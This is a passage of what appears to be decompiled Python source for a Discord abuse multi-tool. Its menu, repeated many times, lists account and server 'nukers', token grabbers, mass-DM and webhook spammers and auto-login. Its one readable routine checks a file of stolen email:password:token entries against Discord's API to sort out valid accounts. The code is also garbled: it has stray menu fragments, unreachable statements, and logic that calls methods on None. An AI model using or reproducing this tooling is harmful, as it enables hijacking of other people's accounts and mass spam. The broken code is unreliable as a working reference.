'][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['[']
        time.sleep(1)
        exit = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '3':
        Spinner()
        print('\n')
        FILENAME = 'tokens.txt'
        FORMAT = 2
        colorama.init(True, **('autoreset',))
        with open(FILENAME, 'r') as token_file:
            token_file.seek(0)
            checktoken = None
            (token, mail, password) = (None, None, None)
            lines = token_file.readlines()
            for headers in lines:
                token = None
                token = token.strip()
                if ':' in token:
                    if FORMAT == 1:
                        token = token.split(':')
                        token = token[0]
                        password = token[1]
                    elif FORMAT == 2:
                        token = token.split(':')
                        mail = token[0]
                        password = token[1]
                        token = token[2]
                    elif FORMAT == 3:
                        token = token.split(':')
                        token = token[0]
                        mail = token[1]
                        password = token[2]
                checktoken = httpx.get('https://discord.com/api/v9/users/@me', headers, **('headers',))
                if checktoken is None:
                    (print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] There are no tokens found in {colorama.Fore.RED}{FILENAME}'''), sys.exit(10))
                
                try:
                    if checktoken.json()['message'] == '401: Unauthorized':
                        print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Invalid Token | {colorama.Fore.RED}{token}''')
                finally:
                    continue
                    KeyError
                    []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']
                    []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']
                    if checktoken.json()['verified'] is False:
                        print(f'''[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Valid {Fore.LIGHTGREEN_EX}Unverified{Fore.RESET} | {colorama.Fore.CYAN}{token[:63]}*********''')
                    elif checktoken.json()['email'] is not None and checktoken.json()['phone'] is not None:
                        print(f'''[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Valid {Fore.LIGHTGREEN_EX}Fully Verified{Fore.RESET} | {colorama.Fore.CYAN}{token[:63]}*********''')
                    elif checktoken.json()['email'] is not None and checktoken.json()['phone'] is None and checktoken.json()['verified'] is True:
                        print(f'''[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Valid {Fore.LIGHTGREEN_EX}Email Verified{Fore.RESET} | {colorama.Fore.CYAN}{token[:63]}*********''')
                    elif checktoken.json()['email'] is None and checktoken.json()['phone'] is not None:
                        print(f'''[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Valid {Fore.LIGHTGREEN_EX}Phone Verified{Fore.RESET} | {colorama.Fore.CYAN}{token[:63]}*********''')
                    continue
                    print(f'''\n\n[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done, All Tokens Has Been Checked''')
                    time.sleep(2)
                    exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
                    exit = clear()
                    exit = spammer()
                    []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID 